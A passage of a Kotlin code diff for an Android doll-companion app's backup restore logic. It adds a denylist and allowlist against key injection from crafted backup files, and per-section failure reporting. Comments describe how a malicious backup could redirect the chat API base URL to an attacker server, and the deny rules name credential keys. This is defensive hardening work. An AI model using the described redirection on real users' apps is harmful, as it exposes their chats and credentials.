@@ -3,9 +3,11 @@ package com.dollhouse.app.data
 import android.content.Context
 import android.content.SharedPreferences
 import android.util.Base64
+import com.dollhouse.app.PetService
 import com.dollhouse.app.ai.AiModel
 import com.dollhouse.app.ai.Provider
 import com.dollhouse.app.core.Logs
+import com.dollhouse.app.pet.AnimBaker
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
@@ -157,6 +159,229 @@ object AllInOneArchive {
     private val BOUND_ORIENTS = arrayOf(DollProfile.ORIENT_PORT, DollProfile.ORIENT_LAND)
 
     /**
+     * 【P0 安全·键注入】危险键前缀 / 全名黑名单（纵深防御，第二道闸门）。
+     *
+     * ## 为什么需要这一层（即使已经有白名单）
+     * 白名单是**根治**，但它有一个只有未来才会暴露的失效模式：将来有人往
+     * [PERSONA_BASES] 里加一项、而那一项恰好与敏感键同名前缀（例如有人图省事加
+     * `"provider"`、`"model"`、`"conv_"`），白名单就会当场把注入通道重新打开。
+     * 黑名单独立于白名单判定，能在那一刻拦住 —— 两道闸门的失效条件不重叠。
+     *
+     * ## 清单依据（每个前缀对应一个真实的越权后果）
+     * · `pv_`        → [ProviderStore.KEY_PROVIDERS] `pv_list` / `KEY_CURRENT` `pv_cur` /
+     *                  `KEY_MODELS` `pv_models`：**改写供应商列表与当前模型 → baseUrl 指向
+     *                  攻击者服务器 → 之后所有聊天明文 POST 出去**。这是本漏洞的实际攻击目标。
+     * · `api_key`    → 密钥位置。换机不可用的密文塞进来会让用户以为「密钥备好了」，实际全部 401。
+     * · `base_url`   → [PetPrefs] 旧版出网地址；`activeBaseUrl` 为空时**回退读它**，
+     *                  与 `pv_*` 等效的劫持入口（老用户没有 `pv_list` 也照样被打中）。
+     * · `provider` / `model` → 供应商与模型的其它持久化键；不属于人设，一律不写。
+     * · `conv_`      → 聊天记录（`conv_<id>` / `conv_read_<id>` / `conv_doll_<id>` …）。
+     *                  人设段写聊天 = 伪造用户历史 / 覆盖会话指针，且与 task-14 的
+     *                  restoreChat 加固撞车，必须在此彻底关闭。
+     * · `my_avatar` / `my_name` / `my_bio` → 「我」的资料（[MyProfile]）。只应由
+     *                  `restoreMyProfile` 用**具名 API** 合并，不经任意键通道。
+     * · `mem2_`      → 记忆条目与画像（`mem2_list_` / `mem2_profile_` / `mem2_conn_`）。
+     * · `doll_anim_` → 动作库整段 JSON；由 [restoreAnim] 专管（含帧路径重写），
+     *                  不能绕过它直接写。
+     * · `theme` / `bg_` / `scrim` / `web_search` / `think_level` / `groups` /
+     *                  `affection` → 全局外观与开关，由 `restoreSettings` 的具名 setter 管。
+     * · `token` / `secret` / `key_` / `chat_history` / `history` → 任何形态的凭据与全量历史。
+     */
+    private val DANGEROUS_KEY_PREFIXES = arrayOf(
+        "pv_", "api_key", "base_url", "provider", "model",
+        "conv_", "my_avatar", "my_name", "my_bio",
+        "mem2_", "doll_anim_",
+        "theme", "bg_", "scrim", "web_search", "think_level", "groups", "affection",
+        "token", "secret", "key_", "chat_history", "history"
+    )
+
+    /** 危险键的**精确**全名（前缀表之外的补充，用于无共同前缀的旧键）。 */
+    private val DANGEROUS_KEY_EXACT = arrayOf(
+        "base_url", "active_base_url", "api_key", "apiKey",
+        "pv_list", "pv_cur", "pv_models"
+    )
+
+    /**
+     * 键是否命中危险清单（黑名单 / 第二道闸门）。
+     *
+     * 【为什么先判黑名单再判白名单】两道闸门的失效条件不同，顺序上让「无论白名单怎么变
+     *   都不许写」的判定先执行，语义更接近意图：**敏感键永不放行**。
+     */
+    private fun isDangerousKey(key: String): Boolean {
+        if (key.isEmpty()) {
+            return true
+        }
+        for (k in DANGEROUS_KEY_EXACT) {
+            if (key == k) {
+                return true
+            }
+        }
+        for (p in DANGEROUS_KEY_PREFIXES) {
+            if (key.startsWith(p)) {
+                return true
+            }
+        }
+        return false
+    }
+
+    /**
+     * 【P0 安全·唯一展开点】某只人偶**允许导出 / 允许导入**的完整键清单。
+     *
+     * ## 为什么抽成一个函数（这是本次修复的根治点）
+     * 修复前：导出侧按 [PERSONA_BASES] 生成键（严格），导入侧直接用备份文件里的 `k`
+     * 写盘（宽松）。**导出严、导入松的非对称**就是漏洞本身 —— 备份文件是用户可以从
+     * 网上下载的**外部输入**，不能按「自己的导出格式」无条件信任。
+     * 现在两侧都走这一个函数：键集合只有一份，将来给 [PERSONA_BASES] 加项时，
+     * 导出与导入会**自动同步**，不存在「一边加了另一边忘了」而重新打开缺口的可能。
+     *
+     * ## 动态键 [DollProfile.key] `bounds` 的处理
+     * `bounds` 本身不是键，真键是 `bounds_<l|t|r|b>_<port|land>` 共 8 个/人偶。
+     * 这里按 [BOUND_SIDES] × [BOUND_ORIENTS]**穷举展开**，而不是用 `startsWith("bounds_")`
+     * 之类的模糊前缀 —— 模糊匹配会把 `bounds_l_port_evil` 这类不存在的键也放进来，
+     * 所以必须枚举成精确集合。
+     *
+     * 键形态仍由 [DollProfile.key] 决定（默认人偶裸键、其余带 `_<dollId>` 后缀），
+     * 与读取端同一规则，不在这里重新实现拼接约定。
+     */
+    private fun personaKeysOf(dollId: String): List<String> {
+        val keys = ArrayList<String>(
+            PERSONA_BASES.size + BOUND_SIDES.size * BOUND_ORIENTS.size
+        )
+        for (b in PERSONA_BASES) {
+            keys.add(DollProfile.key(dollId, b))
+        }
+        for (o in BOUND_ORIENTS) {
+            for (s in BOUND_SIDES) {
+                keys.add(DollProfile.key(dollId, "bounds_" + s + "_" + o))
+            }
+        }
+        return keys
+    }
+
+    /**
+     * 某个**外来**键（来自备份文件）是否允许写到 [`dollId`] 名下。
+     *
+     * 判据是**精确成员判定**：键必须是 [personaKeysOf] 算出来的那一批之一。
+     * 不做「后缀看起来像人偶 id」之类的猜测 —— 猜测型的反向解析很容易被
+     * `dollId` 里带下划线（如 `a_b`）的构造绕过。
+     *
+     * @param dollId 已经过 `DollStore.byId` 存在性校验的人偶 id
+     */
+    private fun isAllowedPersonaKey(dollId: String, fullKey: String): Boolean {
+        if (dollId.isEmpty() || fullKey.isEmpty()) {
+            return false
+        }
+        if (isDangerousKey(fullKey)) {
+            return false
+        }
+        return personaKeysOf(dollId).contains(fullKey)
+    }
+
+    /**
+     * 【P0·工厂预写豁免清单】启动种子 `DollProfile.seedDefault()` 会给**默认人偶**预写的键。
+     *
+     * ## 为什么需要单独一张表（而不是把判据改宽）
+     * 恢复侧的口径是「只写本机没有的键」，目的是**不覆盖用户的选择**。
+     * 但 `p.contains(k)` 把「工厂写的默认值」也当成了「用户的选择」—— 保护对象搞错了。
+     * 我们对「用户**没**表过态」的键没有意见；我们只是不能碰「用户**改过**」的键。
+     *
+     * ## 为什么必须限定在 DEFAULT_ID
+     * `seedDefault()` 只写 `key(DEFAULT_ID, ...)` = **裸键**（见 [DollProfile.key]）。
+     * 用户新建的人偶没有任何工厂预写（`重置/新建`走的是空白模板），
+     * 所以非默认人偶的键**不在**本表里 —— 它们的判据保持纯 `contains`，
+     * 效果与修复前一致。把整张表当成「所有人偶都豁免」会误把别人机器上的
+     * 旧人设顶到本机非默认人偶上。
+     *
+     * ## 为什么值比对是安全的（对比 scrim 那次）
+     * `seedDefault` 写的是**确定常量**：
+     *   · `persona`    ← `PetPrefs.SYSTEM_PROMPT`（固定字符串常量）
+     *   · `talk_lines` ← `PetService.LINES_TAP` 序列化成 JSON（固定 3 条）
+     * 它们不随机器/时间变化，所以「当前值 == 工厂值」能可靠地代表「这个值还是工厂写的」。
+     * 反例（**故意不采用**）：`scrim_strength` 的迁移公式里含着当前值，值比对会变成
+     * 循环不动点（会把用户主动拖到 0~40 的任何值都判成「没动过」）—— 那个场景必须用
+     * 快照键。本处没有这个风险，所以不需要快照键。
+     *
+     * 注意这两个键**不在**本表之外的任何地方被启动逻辑写：`DollProfile` 的其余
+     * setter 只在 UI 交互时调用（已逐个核对 `away_seconds` / `pet_scale` /
+     * `return_seconds` / `home_*` / `frame_*` / `bounds_*` / `chatbg*` / `bubble_*` /
+     * `size_spec` / `flip` / `gesture_*` / `persona_spec` —— 均无启动预写）。
+     */
+    private val SEEDED_PERSONA_BASES = arrayOf(
+        "persona", "talk_lines"
+    )
+
+    /**
+     * 把 `talk_lines` 序列化成与 `DollProfile.seedDefault()` 完全一致的形式。
+     *
+     * 【为什么必须逐字复刻而不是「解析成列表再比内容」】`seedDefault` 用
+     * `JSONArray().put(line)` 逐条写入，恢复侧的 `hasMessages`/解析口径不影响这里；
+     * 如果我们用「解析后比较集合」，用户把 3 条台词**调换了顺序**就会被误判成
+     * 「没动过」而覆盖掉 —— 顺序本身就是用户的编辑。所以按原始字符串比较。
+     */
+    private fun seedTalkLinesRaw(): String {
+        val arr = JSONArray()
+        for (line in PetService.LINES_TAP) {
+            arr.put(line)
+        }
+        return arr.toString()
+    }
+
+    /**
+     * 这个键的当前值是否**仍等于工厂种子写的那个值**（= 用户没改过）。
+     *
+     * @return true 表示「用户没动过，允许备份覆盖」
+     */
+    private fun isStillFactoryValue(p: SharedPreferences, key: String): Boolean {
+        return try {
+            when (key) {
+                DollProfile.key(DollStore.DEFAULT_ID, "persona") ->
+                    p.getString(key, null) == PetPrefs.SYSTEM_PROMPT
+                DollProfile.key(DollStore.DEFAULT_ID, "talk_lines") ->
+                    p.getString(key, null) == seedTalkLinesRaw()
+                else -> false
+            }
+        } catch (t: Throwable) {
+            // 读失败就当作「不是工厂值」→ 保守地不覆盖（宁可少写，不可误覆盖用户内容）。
+            false
+        }
+    }
+
+    /**
+     * 人设恢复的核心判据：**这个键到底该不该被备份写入**。
+     *
+     * 三种情形：
+     * 1. **键不存在** → 写（本机确实没有，这正是「补齐」的本意）。
+     * 2. **键存在，但值是工厂种子写的** → 写（用户没表过态，工厂值不是用户的选择）。
+     * 3. **键存在，且值不是工厂值** → 不写（用户改过，必须保留）。
+     *
+     * 第 2 条是本次 P0 修复的关键：没有它，换机用户（必然先启动过 App）
+     * 的性格与台词永远恢复不了。
+     *
+     * 【为什么例外表只对 DEFAULT_ID 生效】见 [SEEDED_PERSONA_BASES] 的说明。
+     */
+    private fun shouldWritePersonaKey(p: SharedPreferences, dollId: String, key: String): Boolean {
+        if (!p.contains(key)) {
+            return true
+        }
+        // 只有默认人偶会被 seedDefault 预写；非默认人偶保持纯 contains 语义。
+        if (dollId != DollStore.DEFAULT_ID) {
+            return false
+        }
+        // 这个键是否属于「会被工厂预写」的那一批（避免把用户真改过的其它键也覆盖）。
+        var seeded = false
+        for (b in SEEDED_PERSONA_BASES) {
+            if (key == DollProfile.key(dollId, b)) {
+                seeded = true
+                break
+            }
+        }
+        if (!seeded) {
+            return false
+        }
+        return isStillFactoryValue(p, key)
+    }
+
+    /**
      * 动作库在偏好里的键前缀。
      *
      * 【为什么硬编码】`DollAnim.KEY_PREFIX` 是 private；本类只需要「原样搬运这段 JSON」，
@@ -280,15 +505,10 @@ object AllInOneArchive {
             if (dollId.isEmpty()) {
                 continue
             }
-            val keys = ArrayList<String>()
-            for (b in PERSONA_BASES) {
-                keys.add(DollProfile.key(dollId, b))
-            }
-            for (o in BOUND_ORIENTS) {
-                for (s in BOUND_SIDES) {
-                    keys.add(DollProfile.key(dollId, "bounds_" + s + "_" + o))
-                }
-            }
+            // 【P0 安全·与导入侧共用同一份清单】键的展开规则只有 [personaKeysOf] 一处。
+            //   修复前这里用的是内联的两层循环、导入侧完全没有对应校验 ——
+            //   正是那种「两边各写一份」导致导出严、导入松的非对称。详见 [isAllowedPersonaKey]。
+            val keys = personaKeysOf(dollId)
             val arr = JSONArray()
             for (k in keys) {
                 val v = all[k] ?: continue
@@ -428,15 +648,50 @@ object AllInOneArchive {
         return out
     }
 
-    /** 动作库元数据（原样搬运；帧图本体在图片段）。 */
+    /**
+     * 动作库元数据（帧图本体在图片段）。
+     *
+     * 【v0.2.8·修 P1·内置动作不得带出源机帧路径】
+     *
+     * 改造前这里是**整段原样搬运**：`out.put(doll.id, raw)`。而 [collectWanted] 又
+     * **刻意跳过内置动作的帧图**（理由见该函数：内置帧由 [com.dollhouse.app.pet.AnimBaker]
+     * 在本机按机型实时烘，换机后必须按新机型重烘，塞进包里只是十几 MB 废数据）。
+     *
+     * 这两条决策放在一起就自相矛盾：
+     *   · 帧**不**打包  → 目标机拿到的是 base64 之外的空气
+     *   · 路径**照**导出 → 目标机动作库里写满 `/data/user/0/.../anim/<id>/0.png` 这类源机绝对路径
+     * 恢复后 `frames` **非空但全部指向不存在的文件**，于是：
+     *   · `DollAnimPage` 判 `frames.isNotEmpty()` 就当"有帧"直接用，**不会重烘**；
+     *   · `ActionPlayerCore.decodeFramesAsync` 逐张解码失败 → 画面停成一张静态图。
+     * 用户换机后看到的是「人偶不会动了」，而且没有任何提示。
+     *
+     * 【修法】内置动作只导元数据，**frames 与 asset_path 一律不写**。
+     *   恢复侧（[restoreAnim]）据此把它们标成「待重烘」，再由 [rebakeBuiltinFrames]
+     *   按本机屏幕重新生成。这样「帧不打包」这条决策才真正自洽。
+     *
+     * 【为什么保留其余字段】id / name / fps / loop / group / builtin 是**元数据**，
+     *   与机型无关：用户可能调过某个内置动作的 fps，或把它挪过分组 —— 那些要带走。
+     */
     private fun exportAnim(ctx: Context): JSONObject {
         val out = JSONObject()
         val p = PetPrefs.get(ctx)
         for (doll in DollStore.all(ctx)) {
             val raw = p.getString(ANIM_KEY_PREFIX + doll.id, "") ?: ""
-            if (raw.isNotEmpty()) {
-                out.put(doll.id, raw)
+            if (raw.isEmpty()) {
+                continue
             }
+            val arr = parseArray(raw)
+            for (i in 0 until arr.length()) {
+                val a = arr.optJSONObject(i) ?: continue
+                if (!a.optBoolean("builtin", false)) {
+                    continue
+                }
+                // 【就地剥掉】arr 是 parseArray 出来的新对象（不是共享引用），
+                //   改它不会影响磁盘上那份动作库。
+                a.remove("frames")
+                a.put("asset_path", "")
+            }
+            out.put(doll.id, arr.toString())
         }
         return out
     }
@@ -638,6 +893,79 @@ object AllInOneArchive {
         val frames = HashMap<String, String>()
         /** 真正写到盘上的文件数（含本来就存在而跳过的）。 */
         var filesWritten = 0
+
+        /**
+         * 写盘失败的图片张数（【P1-3】此前完全静默，用户拿到「恢复完成」却看到空白封面）。
+         *
+         * 【为什么要单独计数而不是并进 filesWritten】两者语义相反：一个是「确实有了」，
+         *   一个是「本来该有却没有」。混在一起会让摘要既不能报成功也不能报失败。
+         *   这个数字唯一的用途就是让摘要**诚实**地说出「有几张没写进去」。
+         */
+        var failedImages = 0
+    }
+
+    /**
+     * 恢复过程的失败收集器 —— **唯一口径**。
+     *
+     * ## 为什么必须逐段收集，而不是包一个巨大的 try/catch
+     * 恢复的九段是**依次落盘**的。若第 5 段（人设）抛异常而外面只有一个大 catch：
+     *   · 前 4 段（供应商 / 模型 / 图片 / 人偶）**已经写进去了**；
+     *   · 异常冒泡到 UI → 显示红色「恢复失败」；
+     *   · **用户得到的信息与事实相反**：他以为全没恢复，实际恢复了一半。
+     *   他可能去卸载重装「清干净」，**把已恢复的那半也一并丢掉** —— 比不恢复更糟。
+     *
+     * 所以每段独立 try/catch，一段失败不阻断后续（能恢复多少算多少），
+     * 并把**段名**记下来让摘要能如实说出「哪几段没成」。
+     *
+     * ## 段名用中文而非段常量
+     * `SEC_PERSONA` 这类是存储层标识（"persona"），用户读不懂也不必读；
+     * 这里存的是给人看的名字（"人设"）。两者不混用，避免把内部字段名泄漏到 UI。
+     */
+    private class RestoreFailures {
+        private val names = ArrayList<String>()
+
+        /** 记一段失败。`t` 可为 null（调用方只想标记失败、不想记栈）。 */
+        fun record(name: String, t: Throwable?) {
+            names.add(name)
+            Logs.w(TAG, "恢复段失败：" + name, t)
+        }
+
+        fun isEmpty(): Boolean = names.isEmpty()
+
+        /** 给人看的段名串联，如「人设、聊天记录」。 */
+        fun describe(): String {
+            val sb = StringBuilder()
+            for (n in names) {
+                if (sb.isNotEmpty()) {
+                    sb.append("、")
+                }
+                sb.append(n)
+            }
+            return sb.toString()
+        }
+    }
+
+    /** 跑一个不返回值的恢复段；抛异常就记名并继续下一段。 */
+    private inline fun runSection(failures: RestoreFailures, name: String, body: () -> Unit) {
+        try {
+            body()
+        } catch (t: Throwable) {
+            failures.record(name, t)
+        }
+    }
+
+    /** 跑一个返回值的恢复段；抛异常时记名并返回 null（调用方用 `?: 默认值` 兜底）。 */
+    private inline fun <T> runSectionValue(
+        failures: RestoreFailures,
+        name: String,
+        body: () -> T
+    ): T? {
+        return try {
+            body()
+        } catch (t: Throwable) {
+            failures.record(name, t)
+            null
+        }
     }
 
     /**
@@ -646,6 +974,9 @@ object AllInOneArchive {
      * 【冲突口径】「只新增 / 只补齐」：目标机已有的同名供应商、已有的人偶字段、
      *   已存在的会话历史与人设键一律不动。这样用户在任何时候点恢复，
      *   最坏情况都是「没导进来」，而不是「把现在的东西覆盖掉」。
+     *
+     * 【P1·逐段异常隔离】见 [RestoreFailures]。任何一段失败都不会阻断后续段，
+     *   摘要会如实报出失败的段名并把整体表述为「部分恢复完成」。
      *
      * @return 一句可直接给用户看的摘要
      */
@@ -657,73 +988,86 @@ object AllInOneArchive {
         val ver = root.optInt("ver", 1)
         val old = ver < 2
 
+        val failures = RestoreFailures()
+
         // ---- 供应商 ----
         var providersAdded = 0
         var apiKeyNeeded = 0
-        val existing = ProviderStore.providers(ctx)
+        // `byName` 要跨到模型段用（模型要按供应商名重新挂归属），所以在段外声明。
         val byName = HashMap<String, Provider>()
-        for (p in existing) {
-            byName[p.name] = p
-        }
         val pvArr = BackupEnvelope.sectionArray(root, SEC_PROVIDERS)
-        for (i in 0 until pvArr.length()) {
-            val o = pvArr.optJSONObject(i) ?: continue
-            val name = o.optString("name", "").trim()
-            if (name.isEmpty()) {
-                continue
+        runSection(failures, "供应商") {
+            for (p in ProviderStore.providers(ctx)) {
+                byName[p.name] = p
             }
-            if (byName.containsKey(name)) {
-                // 同名已存在：不覆盖。密钥是设备绑定的密文，覆盖只会把能用的换成不能用的。
-                continue
+            for (i in 0 until pvArr.length()) {
+                val o = pvArr.optJSONObject(i) ?: continue
+                val name = o.optString("name", "").trim()
+                if (name.isEmpty()) {
+                    continue
+                }
+                if (byName.containsKey(name)) {
+                    // 同名已存在：不覆盖。密钥是设备绑定的密文，覆盖只会把能用的换成不能用的。
+                    continue
+                }
+                val p = Provider.fromJson(o)
+                // 存档里本就没有密钥（v2 已剔除）；这里显式再清一次，防止有人手工塞了密文进来。
+                p.apiKey = ""
+                if (p.id.isEmpty()) {
+                    p.id = ProviderStore.newId()
+                }
+                ProviderStore.saveProvider(ctx, p)
+                byName[name] = p
+                providersAdded++
+                apiKeyNeeded++
             }
-            val p = Provider.fromJson(o)
-            // 存档里本就没有密钥（v2 已剔除）；这里显式再清一次，防止有人手工塞了密文进来。
-            p.apiKey = ""
-            if (p.id.isEmpty()) {
-                p.id = ProviderStore.newId()
-            }
-            ProviderStore.saveProvider(ctx, p)
-            byName[name] = p
-            providersAdded++
-            apiKeyNeeded++
         }
 
         // ---- 模型 ----
         var modelsAdded = 0
         val modelsArr = BackupEnvelope.sectionArray(root, SEC_MODELS)
-        for (i in 0 until modelsArr.length()) {
-            val o = modelsArr.optJSONObject(i) ?: continue
-            val m = AiModel.fromJson(o)
-            if (m.displayName.isEmpty()) {
-                continue
+        runSection(failures, "模型") {
+            for (i in 0 until modelsArr.length()) {
+                val o = modelsArr.optJSONObject(i) ?: continue
+                val m = AiModel.fromJson(o)
+                if (m.displayName.isEmpty()) {
+                    continue
+                }
+                // 归属供应商可能因为同名已存在而换了 id：按名字重新挂一次。
+                val owner = byName.values.firstOrNull { it.id == m.providerId }
+                    ?: byName.values.firstOrNull { it.name == o.optString("providerName", "") }
+                if (owner != null) {
+                    m.providerId = owner.id
+                }
+                if (m.providerId.isEmpty()) {
+                    continue
+                }
+                if (ModelStore.modelExists(ctx, m.providerId, m.displayName, null)) {
+                    continue
+                }
+                if (m.id.isEmpty() || ModelStore.findModel(ctx, m.id) != null) {
+                    m.id = ProviderStore.newId()
+                }
+                ModelStore.saveModel(ctx, m)
+                modelsAdded++
             }
-            // 归属供应商可能因为同名已存在而换了 id：按名字重新挂一次。
-            val owner = byName.values.firstOrNull { it.id == m.providerId }
-                ?: byName.values.firstOrNull { it.name == o.optString("providerName", "") }
-            if (owner != null) {
-                m.providerId = owner.id
-            }
-            if (m.providerId.isEmpty()) {
-                continue
-            }
-            if (ModelStore.modelExists(ctx, m.providerId, m.displayName, null)) {
-                continue
-            }
-            if (m.id.isEmpty() || ModelStore.findModel(ctx, m.id) != null) {
-                m.id = ProviderStore.newId()
-            }
-            ModelStore.saveModel(ctx, m)
-            modelsAdded++
         }
 
         // ---- 图片（必须早于人偶：新人偶要直接指向写好的文件） ----
-        val restored = restoreImages(ctx, BackupEnvelope.sectionArray(root, SEC_IMAGES))
+        // 【顺序不可调换】人偶段要用 restored.singles 里的封面 / 形象路径，
+        //   人设段还要用 singles 里的 chatbg 新路径。图片没落盘就换不到路径。
+        //   即使图片段抛异常，`restored` 也会是那个「尽力而为」的实例（见下），
+        //   后续段照常执行、只是路径可能回落默认 —— 这比整段中止好得多。
+        val restored = runSectionValue(failures, "图片") {
+            restoreImages(ctx, BackupEnvelope.sectionArray(root, SEC_IMAGES))
+        } ?: Restored()
 
         // ---- 人偶 ----
         var dollsAdded = 0
         var dollsFilled = 0
         var activeCandidate = ""
         val dollsArr = BackupEnvelope.sectionArray(root, SEC_DOLLS)
+        runSection(failures, "人偶") {
         for (i in 0 until dollsArr.length()) {
             val o = dollsArr.optJSONObject(i) ?: continue
             val id = o.optString("id", "")
@@ -784,69 +1128,153 @@ object AllInOneArchive {
         if (activeCandidate.isNotEmpty() && DollStore.active(ctx) == null) {
             DollStore.setActive(ctx, activeCandidate)
         }
+        }
 
         // ---- 人设 ----
         // 【必须在 restoreImages 之后】人设里含人偶背景图的路径，要换成目标机的新路径。
-        val personaDolls = restorePersona(
-            ctx,
-            BackupEnvelope.sectionObject(root, SEC_PERSONA),
-            restored.singles
-        )
+        // 【本段失败时摘要口径】personaStat 会是 null → 摘要显示「人设未能恢复（这一段没跑）」，
+        //   与「跑了但全部被你现有的设置保留」是**两种不同状态**，绝不能混成一个数字。
+        //   所以这里用 runSectionValue 返回 null，而不是兜一个空的 PersonaStat()。
+        val personaStat = runSectionValue(failures, "人设") {
+            restorePersona(
+                ctx,
+                BackupEnvelope.sectionObject(root, SEC_PERSONA),
+                restored.singles
+            )
+        }
 
         // ---- 动作库（先落元数据，再改写帧路径） ----
-        val animCount = restoreAnim(ctx, BackupEnvelope.sectionObject(root, SEC_ANIM), restored.frames)
+        val animCount = runSectionValue(failures, "动作库") {
+            restoreAnim(ctx, BackupEnvelope.sectionObject(root, SEC_ANIM), restored.frames)
+        } ?: 0
 
         // ---- 记忆 ----
+        //
+        // 【P1·超限必须在**写入前**拦住，不能靠 Mem.add 事后截断】
+        //   `Mem.add` 的语义是「追加后若超 MAX_ENTRIES 就砍掉最旧的」，并且**仍然返回 true**。
+        //   这个语义对日常使用是对的（新记忆最重要，旧的让位），但**恢复场景下是灾难**：
+        //     备份 300 条 → 第 201 条起每条写进去就被砍 → Mem.add 照样 true →
+        //     `memsAdded` 照常累加 → 摘要报「新增 300 条」，盘上只有 200 条，
+        //     而且**丢的恰是最早那批**（时间最久、情感价值最高）。
+        //   所以在恢复侧**写入前查条数**：满了就不写、单独计数、摘要如实报出。
+        //   不改进 Mem.add 的 Boolean 契约 —— 它被多处调用，改返回值会波及一大片。
         var memsAdded = 0
+        // 因条数上限而**没有写入**的记忆条数（按人偶累计）。
+        var memsSkippedByLimit = 0
+        // 因上限跳过的人偶 id 集合（摘要里提示「哪些人偶的记忆没导全」）。
+        val memLimitedDolls = LinkedHashSet<String>()
         val memObj = BackupEnvelope.sectionObject(root, SEC_MEMORIES)
-        val memKeys = memObj.keys()
-        while (memKeys.hasNext()) {
-            val dollId = memKeys.next()
-            // 只恢复到确实存在的人偶上：孤儿记忆检索不到，也没有界面能看。
-            if (DollStore.byId(ctx, dollId) == null) {
-                continue
-            }
-            val arr = memObj.optJSONArray(dollId) ?: continue
-            for (i in 0 until arr.length()) {
-                val o = arr.optJSONObject(i) ?: continue
-                val m = Memory.fromJson(o)
-                if (m.title.isEmpty()) {
+        runSection(failures, "记忆") {
+            val memKeys = memObj.keys()
+            while (memKeys.hasNext()) {
+                val dollId = memKeys.next()
+                // 只恢复到确实存在的人偶上：孤儿记忆检索不到，也没有界面能看。
+                if (DollStore.byId(ctx, dollId) == null) {
                     continue
                 }
-                if (Mem.findByTitle(ctx, dollId, m.title) != null) {
-                    continue
-                }
-                if (Mem.add(ctx, dollId, m)) {
-                    memsAdded++
+                val arr = memObj.optJSONArray(dollId) ?: continue
+                for (i in 0 until arr.length()) {
+                    val o = arr.optJSONObject(i) ?: continue
+                    val m = Memory.fromJson(o)
+                    if (m.title.isEmpty()) {
+                        continue
+                    }
+                    if (Mem.findByTitle(ctx, dollId, m.title) != null) {
+                        continue
+                    }
+                    // 【写入前查上限】每次循环都重查：本机条数会随上面几次 add 增长，
+                    //   用循环外的缓存值会在「本机已有 199 条 + 备份 5 条」时多写 4 条，
+                    //   而那 4 条会被 Mem.add 静默砍掉 —— 又回到本任务要消灭的静默丢失。
+                    if (Mem.list(ctx, dollId).length() >= Mem.MAX_ENTRIES) {
+                        memsSkippedByLimit++
+                        memLimitedDolls.add(dollId)
+                        continue
+                    }
+                    if (Mem.add(ctx, dollId, m)) {
+                        memsAdded++
+                    }
                 }
             }
         }
-        val linksAdded = restoreMemLinks(ctx, BackupEnvelope.sectionObject(root, SEC_MEMLINKS))
-        val profileFilled = restoreMemProfiles(ctx, BackupEnvelope.sectionObject(root, SEC_MEMPROFILE))
+        // 记忆连接同理：`Mem.addLink` 超 MAX_LINKS 也砍最旧并返回 true。
+        var linksSkippedByLimit = 0
+        val linksAdded = runSectionValue(failures, "记忆连接") {
+            restoreMemLinks(ctx, BackupEnvelope.sectionObject(root, SEC_MEMLINKS)) { skipped ->
+                linksSkippedByLimit += skipped
+            }
+        } ?: 0
+        val profileFilled = runSectionValue(failures, "记忆画像") {
+            restoreMemProfiles(ctx, BackupEnvelope.sectionObject(root, SEC_MEMPROFILE))
+        } ?: 0
 
         // ---- 聊天 ----
-        val chatStat = restoreChat(ctx, BackupEnvelope.sectionObject(root, SEC_CHAT), restored.singles)
+        // 【失败时 chatStat 为 null】摘要据此说「聊天记录未能恢复」，
+        //   而不是用一个空的 ChatStat 让摘要一句「新增 0 个会话」蒙过去
+        //   （那正是本任务要消灭的「看起来成功了」）。
+        val chatStat = runSectionValue(failures, "聊天记录") {
+            restoreChat(ctx, BackupEnvelope.sectionObject(root, SEC_CHAT), restored.singles)
+        }
 
         // ---- 我 ----
-        val meFilled = restoreMyProfile(ctx, BackupEnvelope.sectionObject(root, SEC_MYPROFILE), restored.singles)
+        val meFilled = runSectionValue(failures, "「我」的资料") {
+            restoreMyProfile(ctx, BackupEnvelope.sectionObject(root, SEC_MYPROFILE), restored.singles)
+        } ?: 0
 
         // ---- 开关与外观 ----
-        val settingsFilled = restoreSettings(ctx, BackupEnvelope.sectionObject(root, SEC_SETTINGS))
+        val settingsFilled = runSectionValue(failures, "外观与开关") {
+            restoreSettings(ctx, BackupEnvelope.sectionObject(root, SEC_SETTINGS))
+        } ?: 0
 
         // ---- 摘要 ----
-        val sb = StringBuilder("恢复完成。")
+        //
+        // 【P1·先说「部分成功」，再说细节】三态在这里定调：
+        //   · 完全成功            → 「恢复完成。」
+        //   · 有段失败 / 有图写坏  → 「**部分恢复完成**。」+ 失败清单 + 「其余已恢复」
+        //   · 全部段都没成（极端） → 仍然不是「失败」，但要明确说「几乎什么都没恢复」
+        // 绝不能把「部分成功」说成「恢复失败」—— 数据其实已经写进去一半了，
+        // 说成失败会诱导用户卸载重装「清干净」，把已恢复的那半也丢掉。
+        //
+        // 【失败 = 段失败 或 图片写盘失败，统一口径】
+        //   这两类都是「本次恢复有东西没到位」，必须用**同一个**判据定"部分成功"。
+        //   否则会出现「图失败算部分、段失败算成功」这种两套标准。
+        val sectionFailed = !failures.isEmpty()
+        val imageFailed = restored.failedImages > 0
+        val partial = sectionFailed || imageFailed
+
+        val sb = StringBuilder(if (partial) "部分恢复完成。" else "恢复完成。")
+        if (sectionFailed) {
+            // 【为什么列出段名】用户需要知道「哪些没成、哪些已到位」，
+            //   否则他会以为全没恢复（与事实相反），或以为全都好了（更糟）。
+            sb.append("\n以下数据恢复失败：").append(failures.describe()).append("。")
+            sb.append("其余数据已恢复。")
+        }
         sb.append("\n供应商 +").append(providersAdded).append(" 个，模型 +").append(modelsAdded).append(" 个")
         sb.append("\n人偶 +").append(dollsAdded).append(" 只")
         if (dollsFilled > 0) {
             sb.append("（补齐 ").append(dollsFilled).append(" 只的封面 / 形象 / 分组）")
         }
-        if (personaDolls > 0) {
-            sb.append("\n人设：").append(personaDolls).append(" 只人偶补齐了设定")
+        // 【personaStat 为 null = 这一段根本没跑成】绝不能与「跑了但全部保留」混成一个数字：
+        //   · null            → 段失败，摘要已在上面「以下数据恢复失败：人设」里报过；
+        //   · dolls==0 且 kept>0 → 跑了，但用户现有设置更新，全部保留（这是**正常且正确**的）。
+        //   两者对用户的意义完全不同：前者要重试 / 找回备份，后者什么都不用做。
+        if (personaStat != null) {
+            if (personaStat.dolls > 0) {
+                sb.append("\n人设：").append(personaStat.dolls).append(" 只人偶补齐了设定")
+            }
+            // 【说清楚「没被覆盖」这件事】被保留的项如果不报，用户会以为备份里的人设已经导进来了，
+            //   之后发现性格不对，无从判断是「没导」还是「导了但被我现在的人设挡住了」。
+            //   这两者的处置完全不同（前者要重试 / 找回备份，后者什么都不用做），
+            //   所以必须显式告知 —— 判对与说清楚是同一件事的两半。
+            if (personaStat.keptByUser > 0) {
